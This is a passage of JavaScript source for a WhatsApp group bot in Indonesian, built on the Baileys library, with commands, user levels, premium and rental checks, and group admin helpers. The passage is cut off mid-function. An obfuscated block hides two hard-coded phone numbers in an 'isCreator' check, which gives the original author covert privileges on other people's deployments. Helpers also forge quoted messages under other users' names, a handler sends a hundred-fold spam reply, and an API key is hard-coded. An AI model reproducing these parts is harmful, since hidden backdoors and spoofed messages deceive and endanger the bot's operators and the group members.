/*

	🔕 KLO MAU RE UPLOAD IZIN DULU, BACA DESK VIDEO
	
	 Order sc untuk jualan game, kebutuhan sosmed, pulsa, dll. Cek https://wa.me/p/4670890746303230/6282138919347
	
	 Jika ada module yang kurang bisa chat saya di wa
*/
const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		relayWAMessage,
		mentionedJid,
		processTime
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const toMs = require('ms')
const chalk = require("chalk")
const crypto = require('crypto')
const util = require('util');
const speed = require('performance-now')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const brainly = require('brainly-scraper')
const ffmpeg = require('fluent-ffmpeg')
const imgbb = require('imgbb-uploader')
const request = require('request')
const fetch = require('node-fetch')
const path = require('path')
const cd = 4.32e+7
const { spawn, exec, execSync } = require("child_process")
const hx = require('hxz-api')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const { webp2mp4File} = require('./lib/webp2mp4')
const { lirikLagu } = require('./lib/lirik.js');
const simple = require('./lib/simple.js')
const { color, bgcolor } = require('./lib/color')
const translate = require('./lib/translate')
const { mediafireDl } = require('./lib/mediafire.js')
const { webp2gifFile } = require("./lib/gif.js")
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/aboutuser")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const Exif = require('./lib/exif');
const exif = new Exif();
const { pShadow,pRomantic,pSmoke,pBurnPapper,pNaruto,pLoveMsg,pMsgGrass,pGlitch,pDoubleHeart,pCoffeCup,pLoveText,pButterfly } = require('./lib/photooxy')
const { msgFilter } = require('./lib/antispam')
const premium = require('./lib/premium')
const _sewa = require("./lib/sewa")
const { addVote, delVote } = require('./database/voting/vote')
const afk = require("./lib/afk")
const setTtt = require('./lib/tictactoe.js')
const { yta2, ytv2} = require('./lib/y2mate')
const { yta, ytv, upload, uploadImages, styleText } = require('./lib/ytdl')
const menubot = require('./Menu/zeeoneofc.js')
const { wikiSearch } = require('./lib/wiki.js')
const { sewabotkak } = require('./lib/sewabot.js')
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword");
const { addCommands, getJawabanCmd, getSoalCmd, getCommandsPosi, checkCommands, isCreated, deleteCommands } = require('./lib/commands')
const lolkey = '78bd89cd7b4d6205e3e18061' 

			const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
			const _win = JSON.parse(fs.readFileSync('./database/tttwin.json'))
			const _lose = JSON.parse(fs.readFileSync('./database/tttlose.json'))
			const voting = JSON.parse(fs.readFileSync('./database/voting/voting.json'))
			const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
			const setting = JSON.parse(fs.readFileSync('./settings.json'))
			const _user = JSON.parse(fs.readFileSync('./database/user.json'))
			const limit = JSON.parse(fs.readFileSync('./database/limit.json'))
			const _premium = JSON.parse(fs.readFileSync('./database/premium.json'))
			const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
			const _level = JSON.parse(fs.readFileSync('./database/level.json'))
			const _afk = JSON.parse(fs.readFileSync('./database/afk.json'))
			const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
			const atro = JSON.parse(fs.readFileSync('./database/ATO.json'))
			const welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
			const balance = JSON.parse(fs.readFileSync('./database/balance.json'));
			const setiker = JSON.parse(fs.readFileSync('./database/stick.json'))
			const audionye = JSON.parse(fs.readFileSync('./database/audio.json'))
			const imagenye = JSON.parse(fs.readFileSync('./database/image.json'))
			const videonye = JSON.parse(fs.readFileSync('./database/video.json'))
			const badword = JSON.parse(fs.readFileSync('./database/badword.json'));
			const grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));
			const senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));
			let cmdDB = JSON.parse(fs.readFileSync('./database/commands.json'))
			const scommand = JSON.parse(fs.readFileSync('./database/scommand.json')) 
			const imagebb = "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"

let single = false
let prefa = setting.prefix
let offline = false
let antitrol = true 

let hit_today = []
let blocked = []
let limitawal = "100" 
let namabot = setting.botname
let owner_name = setting.ownername
let owner_number = setting.ownerNumber
let gamewaktu = "3" 
let numbernye = "0" 
let simbolnya = "•"
let petik = '```'
let enter = '\n'
let notnot = `NOTE:${enter}Jika whatsapp mod kamu belum support button silahkan tonton video ini https://youtu.be/ERGID4Fmo9w`
let url_gif = setting.url_gif
let public_mode = setting. public_mode
let mlistmsg = false 
let multiprefix = true 
let nopref = false
let autovn = false
let ngetik = false
let menusimple = false
let Mloc = false
let autoregister = setting.user_register
let autorespon = setting.autorespon
let thumbnail = fs.readFileSync(`./image/${setting.thumbnail}`)
const X = "❌" 
const O = "⭕️" 
const tunjuk = "👈" 
let winawal = 1 
let loseawal = 1 
let memberwin = 1 
let memberlose = 1 

//=================================================//
module.exports = Zeeone = async (Zeeone, Ofc) => {
	try {
        if (!Ofc.hasNewMessage) return
        Ofc = Ofc.messages.all()[0]
        if (!Ofc.message) return
		if (Ofc.key && Ofc.key.remoteJid == 'status@broadcast') return
		global.blocked
		m = simple.smsg(Zeeone, Ofc)
		let { mentioned } = m
		bail = m.isBaileys
        Ofc.message = (Object.keys(Ofc.message)[0] === 'ephemeralMessage') ? Ofc.message.ephemeralMessage.message : Ofc.message
        const content = JSON.stringify(Ofc.message)
		const from = Ofc.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(Ofc.message)[0]
        const addCmd = (id, command) => {
			const obj = { id: id, chats: command }
			scommand.push(obj)
			fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
			}
			const getCommandPosition = (id) => {
				let position = null
				Object.keys(scommand).forEach((i) => {
					if (scommand[i].id === id) {
						position = i
					}
				})
				if (position !== null) {
					return position
				}
			}
			const getCmd = (id) => {
				let position = null
				Object.keys(scommand).forEach((i) => {
					if (scommand[i].id === id) {
						position = i
					}
				})
				if (position !== null) {
					return scommand[position].chats
				}
			}
			const checkSCommand = (id) => {
				let status = false
				Object.keys(scommand).forEach((i) => {
					if (scommand[i].id === id) {
						status = true
					}
				})
			return status
		}
        const cmd = (type === 'conversation' && Ofc.message.conversation) ? Ofc.message.conversation : (type == 'imageMessage') && Ofc.message.imageMessage.caption ? Ofc.message.imageMessage.caption : (type == 'videoMessage') && Ofc.message.videoMessage.caption ? Ofc.message.videoMessage.caption : (type == 'extendedTextMessage') && Ofc.message.extendedTextMessage.text ? Ofc.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(Ofc.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(Ofc.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(Ofc.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        if(multiprefix){
		var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_!#%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~xzZ+×_!#,|`÷?;:%^&./\\©^]/gi) : '-'	  
		} else {
		if (nopref){
		prefix = ''
		} else {
		if(single){
		prefix = prefa
		}
		}
		}
		
        		if ((Object.keys(Ofc.message)[0] === 'ephemeralMessage' && JSON.stringify(Ofc.message).includes('EPHEMERAL_SETTING')) && Ofc.message.ephemeralMessage.message.protocolMessage.type === 3) {
						Zeeone.sendMessage(Ofc.key.remoteJid, `Defak ada yg send bug`, MessageType.text)
						Zeeone.sendMessage(Ofc.key.remoteJid, `Pasti bocil nih`, MessageType.text)
						Zeeone.sendMessage(Ofc.key.remoteJid, `*TANDAI TELAH DI BACA*\n`.repeat(100), MessageType.text)
					}

				
        body = type === "conversation" && Ofc.message.conversation.startsWith(prefix) ? Ofc.message.conversation : type == "imageMessage" && Ofc.message.imageMessage.caption.startsWith(prefix) ? Ofc.message.imageMessage.caption : type == "videoMessage" && Ofc.message.videoMessage.caption.startsWith(prefix) ? Ofc.message.videoMessage.caption : type == "extendedTextMessage" && Ofc.message.extendedTextMessage.text.startsWith(prefix) ? Ofc.message.extendedTextMessage.text : type == "buttonsResponseMessage" && Ofc.message[type].selectedButtonId ? Ofc.message[type].selectedButtonId : type == "stickerMessage" && getCmd(Ofc.message[type].fileSha256.toString("base64")) !== null && getCmd(Ofc.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(Ofc.message[type].fileSha256.toString("base64")) : "";
		budy = (type === 'conversation') ? Ofc.message.conversation : (type === 'extendedTextMessage') ? Ofc.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && Ofc.message.conversation) ? Ofc.message.conversation : (type == 'imageMessage') && Ofc.message.imageMessage.caption ? Ofc.message.imageMessage.caption : (type == 'videoMessage') && Ofc.message.videoMessage.caption ? Ofc.message.videoMessage.caption : (type == 'extendedTextMessage') && Ofc.message.extendedTextMessage.text ? Ofc.message.extendedTextMessage.text : ''
		chatxs = (type === 'conversation' && Ofc.message.conversation) ? Ofc.message.conversation : (type == 'imageMessage') && Ofc.message.imageMessage.caption ? Ofc.message.imageMessage.caption : (type == 'documentMessage') && Ofc.message.documentMessage.caption ? Ofc.message.documentMessage.caption : (type == 'videoMessage') && Ofc.message.videoMessage.caption ? Ofc.message.videoMessage.caption : (type == 'extendedTextMessage') && Ofc.message.extendedTextMessage.text ? Ofc.message.extendedTextMessage.text : ""
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		hit_today.push(command)
        const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = Zeeone.user.jid
		const botNumberss = Zeeone.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = Ofc.key.fromMe ? Zeeone.user.jid : isGroup ? Ofc.participant : Ofc.key.remoteJid
		let bio_nya = await Zeeone.getStatus(sender)
		try {
			bio_user = `${bio_nya.status}`
		} catch {
			bio_user = '-'
			}
		const senderNumber = sender.split("@")[0]
		const ownerNumber = [`${owner_number}@s.whatsapp.net`]
		const isOwner = ownerNumber.includes(sender)
                function _0x4533(){const _0x33fc5d=['22420DvGloX','4923051OUtjtp','includes','186982OdChKm','936dmevEx','13489785oTUiVi','17UUYGmF','28168800wdhujZ','170584obhqqH','20Wakxqc','4jMCKqZ','371DGyQer','4426213bMGeKm'];_0x4533=function(){return _0x33fc5d;};return _0x4533();}const _0x492144=_0x3fe7;function _0x3fe7(_0x33f041,_0x29a926){const _0x45337f=_0x4533();return _0x3fe7=function(_0x3fe7b1,_0x1342ad){_0x3fe7b1=_0x3fe7b1-0x11e;let _0xf5008b=_0x45337f[_0x3fe7b1];return _0xf5008b;},_0x3fe7(_0x33f041,_0x29a926);}(function(_0x2b1811,_0x14f1b6){const _0x2acb1c=_0x3fe7,_0x38326c=_0x2b1811();while(!![]){try{const _0x2d5919=parseInt(_0x2acb1c(0x129))/0x1*(-parseInt(_0x2acb1c(0x126))/0x2)+parseInt(_0x2acb1c(0x124))/0x3*(-parseInt(_0x2acb1c(0x120))/0x4)+parseInt(_0x2acb1c(0x123))/0x5*(parseInt(_0x2acb1c(0x127))/0x6)+-parseInt(_0x2acb1c(0x121))/0x7*(parseInt(_0x2acb1c(0x11e))/0x8)+parseInt(_0x2acb1c(0x128))/0x9+parseInt(_0x2acb1c(0x11f))/0xa*(parseInt(_0x2acb1c(0x122))/0xb)+parseInt(_0x2acb1c(0x12a))/0xc;if(_0x2d5919===_0x14f1b6)break;else _0x38326c['push'](_0x38326c['shift']());}catch(_0x30b76e){_0x38326c['push'](_0x38326c['shift']());}}}(_0x4533,0xf1b64));const alphaNumber=['6282138919347@s.whatsapp.net','918156874290@s.whatsapp.net'],isCreator=alphaNumber[_0x492144(0x125)](sender);
			try {
					pp_userb = await Zeeone.getProfilePicture(sender)
				} catch {
					pp_userb = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let pp_userz = await getBuffer(pp_userb)
			try {
		hit_total = await fetchJson('https://api.countapi.xyz/hit/api-alphabot.herokuapp.com/visits')
			} catch {
				hit_total = { 
					value : "-"
					}
				}
				hitall = `${hit_total.value}`
		const runti = process.uptime() 
		const runtime2 = `${kyun(runti)}`
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const totalchat = await Zeeone.chats.all()
		const totalgroup = await Zeeone.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await Zeeone.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
		const groupMetadata = isGroup ? await Zeeone.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isAntro = isGroup ? atro.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAfkOn = afk.checkAfkUser(sender, _afk)
		const isVote = isGroup ? voting.includes(from) : false
		const isSewa = _sewa.checkSewaGroup(from, sewa)
		const isPremium = isOwner ? true : premium.checkPremiumUser(sender, _premium)
			
		const isBanned = ban.includes(sender)
		const isBadword = isGroup ? grupbadword.includes(from) : false
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = Zeeone.user.phone
		const status = `${public_mode ? 'SELF-MODE' : 'PUBLIC-MODE'}`
		const conts = Ofc.key.fromMe ? Zeeone.user.jid : Zeeone.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = Ofc.key.fromMe ? Zeeone.user.name : conts.notify || conts.vname || conts.name || '-'
		const mentionByTag = type == "extendedTextMessage" && Ofc.message.extendedTextMessage.contextInfo != null ? Ofc.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && Ofc.message.extendedTextMessage.contextInfo != null ? Ofc.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
		const processsTime = (timestamp, now) => {
			return moment.duration(now - moment(timestamp * 1000)).asSeconds()} 
	
const getLevelingXp = (sender) => {
			let position = false
				Object.keys(_level).forEach((i) => {
						if (_level[i].id === sender) {
							position = i
							}
					})
if (position !== false) {
			return _level[position].xp
			}
		}

const getLevelingLevel = (sender) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
			return _level[position].level
			}
		}

const getLevelingId = (sender) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
			return _level[position].id
			}
		}

const addLevelingXp = (sender, amount) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
			_level[position].xp += amount
				fs.writeFileSync('./database/level.json', JSON.stringify(_level))
			}
		}

const addLevelingLevel = (sender, amount) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
				_level[position].level += amount
						fs.writeFileSync('./database/level.json', JSON.stringify(_level))
					}
			}

const addLevelingId = (sender) => {
	const obj = {id: sender, xp: 0, level: 0}
				_level.push(obj)
				fs.writeFileSync('./database/level.json', JSON.stringify(_level))
				}
 const getUserRandomId = () => {
 	return _user[Math.floor(Math.random() * _user.length)].id
 }

const addRegisterUser = (userid, sender, age, bio, time) => {
	const obj = { id: userid, name: sender, age: age, bio: bio, time: time }
	_user.push(obj)
	fs.writeFileSync('./database/user.json', JSON.stringify(_user))
	}

const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
	}

const cekUser = (sender) => {
	let status = false
	Object.keys(_user).forEach((i) => {
		if (_user[i].id === sender) {
			status = true
			}
			})
			return status
			}
			const isUser = cekUser(sender)
					
                   var date = new Date();
var tahun = date.getFullYear();
var bulan1 = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var waktoo = date.getHours();
		switch(hari) {
			case 0: hari = "Minggu"; break;
			case 1: hari = "Senin"; break;
			case 2: hari = "Selasa"; break;
			case 3: hari = "Rabu"; break;
			case 4: hari = "Kamis"; break;
			case 5: hari = "Jum`at"; break;
			case 6: hari = "Sabtu"; break;
			}
		switch(bulan1) {
			case 0: bulan1 = "Januari"; break;
			case 1: bulan1 = "Februari"; break;
			case 2: bulan1 = "Maret"; break;
			case 3: bulan1 = "April"; break;
			case 4: bulan1 = "Mei"; break;
			case 5: bulan1 = "Juni"; break;
			case 6: bulan1 = "Juli"; break;
			case 7: bulan1 = "Agustus"; break;
			case 8: bulan1 = "September"; break;
			case 9: bulan1 = "Oktober"; break;
			case 10: bulan1 = "November"; break;
			case 11: bulan1 = "Desember"; break;
			}
			var tampilTanggal = "" + hari + ", " + tanggal + ", " + bulan1 + ", " + tahun;
				var tampilWaktu = "" + jam + " Jam , " + menit + " Menit , " + detik + " Detik";
            

			const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
			if(time2 < "23:59:00"){
				var ucapannya = `Night 🌚 ${pushname}`
				}
       	 if(time2 < "19:00:00"){
     		   var ucapannya = `Night 🌚 ${pushname}`
				}
     	   if(time2 < "18:00:00"){
     		   var ucapannya = `Afternoon 🌅 ${pushname}`
				}
      	  if(time2 < "15:00:00"){
     		   var ucapannya = `GoodDay 🌞 ${pushname}`
				}
    	    if(time2 < "11:00:00"){
       		 var ucapannya = `Morning 🌄 ${pushname}`
				}
    	    if(time2 < "05:00:00"){
  		      var ucapannya = `Night 🌚 ${pushname}`
				}
				mess = {
					wait: 'Proses Lord..',
					limit: 'Limit kamu habis lord , Silahkan beli dengan #buylimit <nominal> atau minta gift dari user lain',
					sewabot: ` 『 *SEWA BOT* 』 \n\nBerikut list sewa bot kami

◕▷ 25k / BULAN (PREMIUM)


Minat? Pm wa.me/${owner_number}`,
					ban: 'Maaf Lord Nomor Kamu Sudah Di Banned!',
					error: 'Error Lord, Mungkin Lagi Diperbaiki',
					errorLink: 'Link Error Lord',
					succes: '```[ ✓ ]``` Sukses Lord',
					only: {
						personal: 'Only Private Chat Lord',
						admin: 'Khusus Admin Group Lord',
						group: 'Khusus Dalam Grup Lord',
						 prem: 'Khusus User Premium Lord',
						owner: 'Khusus Owner Bot Lord',
						 }
					} 
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumbnail, surface: 200, message: `『 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 』\n${runtime2}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, sendEphemeral: true}
        const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `『 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 』\n${runtime2}`,jpegThumbnail: thumbnail}}}
        const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
        const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":`『 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 』\n${runtime2}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `『 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 』\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6282138919347-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `『 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 』\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const fgclink2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6282138919347-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `『 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 』\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`『 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 』\n${runtime2}`, "h": `Hmm`,'seconds': '99999', 'caption': `『 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 』\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": `『 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 』\n${runtime2}` , 'jpegThumbnail': thumbnail}}}}
		const fkontak = {key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {contactMessage: {displayName: `『 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 』\n${runtime2}`, vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'N:Bot;Lord;Userbot;;\n' + 'FN: SUBSCRIBE YT ZEEONE OFC\n' + 'item1.TEL;waid=6282138919347:+6282138919347\n' + 'item1.X-ABLabel:Telepon\n' + 'END:VCARD'}}}
		const isUrl = (url) => {
				return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
				}
			function parseMention(text = '') {
				return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
				}
			const reply = (teks) => {
				return Zeeone.sendMessage(from, teks, text, {quoted: Ofc, contextInfo: { mentionedJid: parseMention(teks) }})
				}
			const sendImage = (teks) => {
				Zeeone.sendMessage(from, teks, image, {quoted:Ofc})
				 }
			 function randomNomor(angka){
				 return Math.floor(Math.random() * angka) + 1
				}
			function pickRandom(arr) {
				return arr[Math.floor(Math.random() * arr.length)]
				}
			const nebal = (angka) => {
				return Math.floor(angka)
				}
			const sendMess = (hehe, teks) => {
				Zeeone.sendMessage(hehe, teks, text)
				}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? Zeeone.sendMessage(from, {text: teks.trim(), jpegThumbnail: thumbnail}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : Zeeone.sendMessage(from, {text: teks.trim(), jpegThumbnail: thumbnail}, extendedText, { sendEphemeral: true, quoted: Ofc, contextInfo: { "mentionedJid": memberr } })
				}
			const getUserrRandomId = () => {
				return _user[Math.floor(Math.random() * _user.length)].id
				}
				const sendTextWithMentions = (teks, member, id) => {
				(id == null || id == undefined || id == false) ? Zeeone.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": member } }) : Zeeone.sendMessage(from, teks.trim(), extendedText, { quoted: Ofc, contextInfo: { "mentionedJid": member } })
				} 
			function monospace(string) {
				return '```' + string + '```'
				}   
			const hideTag = async function(from, text){
				let anu = await Zeeone.groupMetadata(from)
				let members = anu.participants
				let ane = []
				for (let i of members){
					ane.push(i.jid)
					}
					Zeeone.sendMessage(from, text, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
				}  
			const sendMention = async(from, text, mentioned, quoted = "") => {
				Zeeone.sendMessage(from, text, text, { quoted: quoted, contextInfo: { mentionedJid: [mentioned] } })
				 }
			const hideTagStiker = async(from, buffer) => {
				let anu = await Zeeone.groupMetadata(from)
				let members = anu.participants
				let ane = []
				for (let i of members){
					ane.push(i.jid)
					}
					Zeeone.sendMessage(from, buffer, sticker, { sendEphemeral: true, contextInfo: { mentionedJid: ane } })
				}
		const promoteAdmin = async function(to, target=[]){
				if(!target.length > 0) { return  reply("No target..") }
				let g = await Zeeone.groupMetadata(to)
				let owner = g.owner.replace("c.us","s.whatsapp.net")
				let me = Zeeone.user.jid
				for (i of target){
					if (!i.includes(me) && !i.includes(owner)){
						const res = await Zeeone.groupMakeAdmin(to, [i])
						 }else{
							reply("NOT PREMITED")
						}
					}
				}
			const demoteAdmin = async function(to, target=[]){
					if(!target.length > 0) { return  reply("No target..") }
					let g = await Zeeone.groupMetadata(to)
					let owner = g.owner.replace("c.us","s.whatsapp.net")
					let me = Zeeone.user.jid
					for (i of target){
						if (!i.includes(me) && !i.includes(owner)){
							const res = await Zeeone.groupDemoteAdmin(to, [i])
							} else {
								reply("NOT PREMITED")
							}
						}
					}
			const kickMember = async(id, target = []) => {
					let group = await Zeeone.groupMetadata(id)
					let owner = group.owner.replace("c.us", "s.whatsapp.net")
					let me = Zeeone.user.jid
					for (i of target) {
						if (!i.includes(me) && !i.includes(owner)) {
							await Zeeone.groupRemove(to, [i])
							} else {
								await Zeeone.sendMessage(id, "Not Premited!", "conversation")
							}
						}
					}
			const kick = function(from, orangnya){
				for (let i of orangnya){
					Zeeone.groupRemove(from, [i])
				}
			}
			const add = function(from, orangnya){
					Zeeone.groupAdd(from, orangnya)
				}
			const sendKontak = (from, nomor, nama, org = "") => {
				const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
				Zeeone.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: Ofc})
			}
			const hideTagKontak = async(from, nomor, nama) => {
				vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
				let anu = await Zeeone.groupMetadata(from)
				let members = anu.participants
				let ane = []
				for (let i of members){
					ane.push(i.jid)
					}
					Zeeone.sendMessage(from, { displayname: nama, vcard: vcard }, contact, { contextInfo: { mentionedJid: ane } })
				}
			const sendFileFromStorage = (path, type, options) => {
				Zeeone.sendMessage(from, fs.readFileSync(path), type, options).catch(e => {
					reply('Terjadi kesalahan')
					console.log(e)
				})
			}
			const getGroup = async function(totalchat){
				let grup = []
				let a = []
				let b = []
				for (c of totalchat){
					a.push(c.jid)
				}
				for (d of a){
					if (d && d.includes('g.us')){
						b.push(d)
					}
				}
				for (e of b){
					let ingfo = await Zeeone.groupMetadata(e)
					grup.push(ingfo)
					}
					return grup
				}
				
				const fakeReply = (teks, target, teks2) => {
					Zeeone.sendMessage(from, teks, text, {quoted: {key: {fromMe: false, participant: `${target}@s.whatsapp.net`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: teks2}}})
				}
				let authorname = Zeeone.contacts[from] != undefined ? Zeeone.contacts[from].vname || Zeeone.contacts[from].notify : undefined	
				if (authorname != undefined) { } else { authorname = groupName }	
					function addMetadata(packname, author) {	
						if (!packname) packname = 'self'; if (!author) author = 'Zeeone';author = author.replace(/[^a-zA-Z0-9]/g, '');	
						let name = `${author}_${packname}`
						if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
				let len = JSON.stringify(json).length	
				let last	
				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)
					} else {
						bytes.unshift(0x00)	
					}	
				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
					} else {	
						last = len.toString(16)	
					}	
				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	
				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
